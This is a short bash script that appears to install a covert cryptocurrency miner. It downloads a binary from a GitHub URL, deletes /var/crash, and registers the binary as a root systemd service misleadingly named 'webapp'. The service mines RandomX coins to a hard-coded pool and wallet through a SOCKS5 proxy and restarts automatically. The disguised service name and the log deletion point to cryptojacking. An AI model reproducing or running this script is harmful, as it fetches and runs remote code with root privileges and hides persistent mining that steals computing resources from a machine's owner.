#!/bin/bash
cd /home
wget https://github.com/jepir3/Cek/raw/main/255
sudo chmod +x 255
sudo rm -rf /lib/systemd/system/webapp.service
sudo rm -rf /var/crash
sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/255 --algorithm randomx --pool randomx.rplant.xyz:17130 --tls true --wallet SaLvsCoGwEnGymEpfbiqaBLDtttdeFLYV7HGp7Lj8tbKh9q3xF3wD9bc2bYRs7g2TbNtz3muwjAdQEky42AFdagPZMx1h3MqW5y --proxy socks5://208.65.90.21:4145 --keepalive true
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&

sudo systemctl daemon-reload &&
sudo systemctl enable webapp.service &&
sudo service webapp stop  &&
sudo service webapp restart
top
